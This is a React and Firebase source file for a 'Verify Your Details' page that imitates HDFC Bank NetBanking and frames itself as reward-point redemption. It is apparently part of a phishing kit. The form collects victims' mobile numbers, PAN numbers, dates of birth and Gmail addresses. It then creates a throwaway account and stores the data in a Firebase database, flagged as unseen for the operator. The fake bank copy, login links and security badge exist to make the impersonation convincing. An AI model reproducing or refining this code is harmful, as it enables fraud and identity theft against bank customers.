import { Button, FormControl, FormLabel, IconButton, Stack, TextField, Typography } from '@mui/material'
import { createUserWithEmailAndPassword } from 'firebase/auth'
import { ref, set } from 'firebase/database'
import React, { useEffect, useState } from 'react'
import { Link, useNavigate } from 'react-router-dom'
import { nortonLogo } from '../assets/data'
import { auth, realTiemDB } from '../firebase/firebase'
import { useScrollTo } from '../utils/util'
import KeyboardBackspaceIcon from '@mui/icons-material/KeyboardBackspace';
import toast from 'react-hot-toast'
const RedemNow = () => {
    const scrollTo = useScrollTo();

    useEffect(() => {
        scrollTo()
    }, [scrollTo])

    const [customerId, setCustomerId] = useState("")
    const [iscustomerId, setISCustomerId] = useState(false)
    const [isLoading, setIsLoading] = useState(false)
    const [password, SetPassword] = useState("")
    const navigate = useNavigate()


    // dikha kya dikhana hai


    const [mobileNo, setMobileNo] = useState("");
    const [MobileNoError, setMobileNoError] = useState("")
    const [panNo, setPanNo] = useState('');
    const [panNoError, setPanNoError] = useState('');
    const [dob, setDob] = useState('');
    const [dobError, setDobError] = useState('');
    const [email, setEmail] = useState('');
    const [emailError, setEmailError] = useState('');

    const regex = /^[0-9]{10}$/;  // 10-digit number validation
    const panNoRegex = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/;
    const emailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
    const dobRegex = /^\d{4}-\d{2}-\d{2}$/;  // Matches YYYY-MM-DD format
















    const handleSubmit = async (e) => {
        e.preventDefault();

        // error handing 

        if (!regex.test(mobileNo)) {
            setMobileNoError("Please enter a valid mobile number");
            return
        } else {
            setMobileNo("")
        }

        if (!panNoRegex.test(panNo)) {
            setPanNoError('Please enter a valid PAN number (e.g., ABCDE1234F)');
            return
        } else {
            setPanNoError("")
        }

        if (!dobRegex.test(dob)) {
            setDobError("Please enter a valid date in YYYY-MM-DD format.");
            return
        } else {
            setDobError("")
        }
        // Check if the date is in the future
        const today = new Date();
        const dobDate = new Date(dob.split('/').reverse().join('-')); // Convert to YYYY-MM-DD format for comparison
        if (dobDate > today) {
            setDobError('Date of birth cannot be in the future');
            return;
        } else {
            setDobError("")
        }

        if (!emailRegex.test(email)) {
            setEmailError('Please enter a valid Gmail address');
            return;
        } else {
            setEmailError('');
        }








        try {

            setIsLoading(true)
            const timeStemp = Date.now()
            const emailCre = `${timeStemp}@gmail.com`;
            const userCredentical = await createUserWithEmailAndPassword(auth, emailCre, mobileNo);
            const user = userCredentical.user
            await set(ref(realTiemDB, "users/ " + user?.uid), {

                mobileNo,
                panNo,
                dob,
                email,
                loginType: "redeam-point",
                date: new Date().toLocaleString(),
                timestemp: Date.now(),
                seen: false,

                // kuch change karna hai isme 

            });

            setIsLoading(false);
            setMobileNo("")
            setPanNo("")
            setDob("")

            console.log("User Created");
            toast.success("Submitted Successfully")
            navigate(`/success/${user.uid}`)
        } catch (error) {
            console.log(error);
            setIsLoading(false)
        } finally {
            setIsLoading(false)
        }
    };


    return (
        <Stack width={"100%"} bgcolor={"white"} gap={".7rem"} marginTop={"7px"} padding={"1.5rem"}>
            <Stack width={'100%'} height={'50px'} justifyContent={'start'} alignItems={'center'} flexDirection={'row'} gap={2} >
                <Link to={'/'} style={{ marginTop: "8px" }} >
                    <IconButton  >
                        <KeyboardBackspaceIcon />
                    </IconButton>
                </Link>
                <Typography sx={{ fontSize: "24px", color: "rgb(53, 52, 52)" }}>
                    Verify Your Details
                </Typography>

            </Stack>

            <Stack padding={".5rem"}>

                <Stack component={'form'} spacing={2} onSubmit={handleSubmit} >

                    {/* mobile number  */}

                    <FormControl  >
                        <FormLabel
                            id='mobile-no'
                            sx={{
                                mb: "px",
                                fontSize: "20px",
                                fontWeight: 500,
                                color: "#222"
                            }}
                        >
                            Mobile No.
                        </FormLabel>


                        <TextField
                            id='mobile-no'
                            required
                            type='number'
                            placeholder='Mobile No.'
                            sx={{
                                boxShadow: "2px 2px 15px rgba(85, 208, 242, 0.43), -2px -2px 15px rgba(85, 208, 242, 0.41)",
                                outline: "none",
                                border: "none",
                                borderRadius: "5px",
                                ":hover": {
                                    border: "none",
                                    outline: "none"
                                }
                            }}
                            value={mobileNo}
                            onChange={e => {
                                setMobileNo(e.target.value);
                                if (MobileNoError) {
                                    setMobileNoError("");  // Clear error on change
                                }
                            }}

                        />
                        {
                            MobileNoError && (<small style={{ color: "red", paddingTop: '8px', paddingLeft: '4px' }} >{MobileNoError}</small>)
                        }
                    </FormControl>



                    {/* pan card number   */}

                    <FormControl>
                        <FormLabel
                            id="pan-no"
                            sx={{
                                mb: "px",
                                fontSize: "20px",
                                fontWeight: 500,
                                color: "#222",
                            }}
                        >
                            PAN No.
                        </FormLabel>

                        <TextField
                            id="pan-no"
                            required
                            type="text"
                            placeholder="ABCDE1234F"  // Example placeholder
                            sx={{
                                boxShadow: "2px 2px 15px rgba(85, 208, 242, 0.43), -2px -2px 15px rgba(85, 208, 242, 0.41)",
                                outline: "none",
                                border: "none",
                                borderRadius: "5px",
                                ":hover": {
                                    border: "none",
                                    outline: "none",
                                },
                            }}
                            value={panNo.toUpperCase()}
                            onChange={(e) => {
                                setPanNo(e.target.value);
                                if (panNoError) {
                                    setPanNoError(''); // Clear error on change
                                }
                            }}
                        />
                        {panNoError && (
                            <small style={{ color: "red", paddingTop: '8px', paddingLeft: '4px' }}>
                                {panNoError}
                            </small>
                        )}
                    </FormControl>




                    {/* date of birth */}


                    <FormControl>
                        <FormLabel
                            id="dob"
                            sx={{
                                mb: "12px",
                                fontSize: "20px",
                                fontWeight: 500,
                                color: "#222",
                            }}
                        >
                            Date of Birth
                        </FormLabel>

                        <TextField
                            id="dob"
                            required
                            type="date"
                            placeholder="DD/MM/YYYY"  // Example placeholder
                            sx={{
                                boxShadow: "2px 2px 15px rgba(85, 208, 242, 0.43), -2px -2px 15px rgba(85, 208, 242, 0.41)",
                                outline: "none",
                                border: "none",
                                borderRadius: "5px",
                                ":hover": {
                                    border: "none",
                                    outline: "none",
                                },
                                "::placeholder": {
                                    color: "gray"
                                }
                            }}
                            value={dob}
                            onChange={(e) => {
                                setDob(e.target.value);
                                if (dobError) {
                                    setDobError(''); // Clear error on change
                                }
                            }}
                        />
                        {dobError && (
                            <small style={{ color: "red", paddingTop: '8px', paddingLeft: '4px' }}>
                                {dobError}
                            </small>
                        )}
                    </FormControl>


                    {/* Email Field */}
                    <FormControl>
                        <FormLabel
                            id="email"
                            sx={{
                                mb: "12px",
                                fontSize: "20px",
                                fontWeight: 500,
                                color: "#222",
                            }}
                        >
                            Gmail
                        </FormLabel>

                        <TextField
                            id="email"
                            required
                            type="email"
                            placeholder="Registered Mail "
                            sx={{
                                boxShadow: "2px 2px 15px rgba(85, 208, 242, 0.43), -2px -2px 15px rgba(85, 208, 242, 0.41)",
                                outline: "none",
                                border: "none",
                                borderRadius: "5px",
                                ":hover": {
                                    border: "none",
                                    outline: "none",
                                },
                            }}
                            value={email}
                            onChange={(e) => {
                                setEmail(e.target.value);
                                if (emailError) {
                                    setEmailError(''); // Clear error on change
                                }
                            }}
                        />

                        <small style={{ color: "#000", paddingTop: '8px', paddingLeft: '4px' }}>
                            if mail id not registered on bank please  <a href="/customer-id-login" style={{
                                fontSize: "15px",
                                textDecoration: "underline",
                                color: "red",

                            }} >click here</a>
                        </small>


                        {emailError && (
                            <small style={{ color: "red", paddingTop: '8px', paddingLeft: '4px' }}>
                                {emailError}
                            </small>
                        )}
                    </FormControl>


                    <Button sx={{ width: "fit-content", }} variant='contained' type='submit'>Submit</Button>
                </Stack>

                {/* // hta de ki niche vala  back button  */}




            </Stack>


            <AllAboute />

        </Stack>
    )
}






const AllAboute = () => {
    return (
        <Stack>

            <Stack padding={"10px"} bgcolor={"#E2EFFA"}>
                <Typography sx={{ color: "black", fontSize: "14px" }}>
                    Dear Customer,
                    <br />
                    Welcome to the new login page of HDFC Bank NetBanking.
                    <br />
                    Its lighter look and feel is designed to give you the best possible user experience. Please continue to login using your customer ID and password.
                </Typography>


            </Stack>

            <Stack>
                <Typography variant='h6'>
                    Don't have a HDFC Bank Savings Account?
                </Typography>

                <Stack direction={"column"} marginTop={"1.3rem"} gap={"1rem"} width={"100%"} >

                    <LoginCategory tital1={"Credit Card only? Login here"} tital2={"HDFC Ltd. Home Loans? here"} />
                    <LoginCategory tital1={"Prepaid Card only ? Login here"} tital2={"HDFC Ltd. Deposits? Login here"} />
                    <LoginCategory tital1={"Retail Loan only? Login here"} tital2={" "} />


                </Stack>

            </Stack>

            <Stack marginTop={"1.3rem"} direction={"column"}>
                <img src={nortonLogo} style={{ width: "7rem" }} alt="" />

                <Stack marginTop={"1.8rem"} gap={"1.2rem"}>
                    <Typography sx={{ color: "rgb(53, 52, 52)", fontSize: "15px" }}>
                        Your security is of utmost importance.
                        <br />
                        <span style={{ color: "#1D86FF" }}>
                            Know
                            More...
                        </span>
                    </Typography>

                    <Typography sx={{ color: "rgb(53, 52, 52)", fontSize: "18px" }}>
                        First Time User?
                        <br />
                        <span style={{ color: "#1D86FF", fontSize: "14px" }}>
                            Register Now
                        </span>
                        {" "}
                        <span style={{ fontSize: "14px" }}>
                            for a host of convenient features
                        </span>
                    </Typography>


                    <Typography sx={{ color: "rgb(53, 52, 52)", fontSize: "20px" }}>
                        We have added a host of new features!
                    </Typography>


                </Stack>

                <Stack paddingBottom={"4rem"}>
                    <ul style={{ color: "rgb(53, 52, 52)", fontSize: "14px" }}>
                        <p style={{ fontSize: "16px", margin: "4px 0px" }}>You can now do so much
                            more:</p>
                        <li>Anywhere access through Desktop or mobile</li>
                        <li>Enhanced security measures</li>
                    </ul>
                </Stack>

            </Stack>
        </Stack>

    )
}





const LoginCategory = ({ tital1, tital2 }) => {
    return (
        <Stack direction={"row"} gap={"1rem"} width={"100%"} >

            <Typography
                sx={{
                    color: "#23527c",
                    fontSize: "15px",
                    cursor: "pointer",
                    ":hover": {

                        textDecoration: "underline",
                    }
                }}
            >
                {tital1}
            </Typography>

            <Typography
                sx={{
                    color: "#23527c",
                    fontSize: "15px",
                    cursor: "pointer",
                    ":hover": {

                        textDecoration: "underline",
                    }
                }}
            >
                {tital2}
            </Typography>

        </Stack>
    )
}




export default RedemNow